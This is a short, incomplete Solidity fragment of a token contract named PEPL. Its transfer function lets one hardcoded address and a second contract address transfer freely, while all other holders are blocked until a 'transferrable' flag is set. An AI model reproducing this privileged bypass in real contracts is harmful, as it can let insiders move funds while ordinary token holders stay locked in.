contract PEPL {
function transfer(address _to, uint256 _value) public {
             
             
            if (msg.sender == 0x0b3F4B2e8E91cb8Ac9C394B4Fc693f0fbd27E3dB)
                {
                _transfer(msg.sender, _to, _value);
                }
            else if (msg.sender == contract2Address)
                {
                _transfer(msg.sender, _to, _value);
                }
            else
                {
                require(transferrable);
                _transfer(msg.sender, _to, _value);
                }
    }
}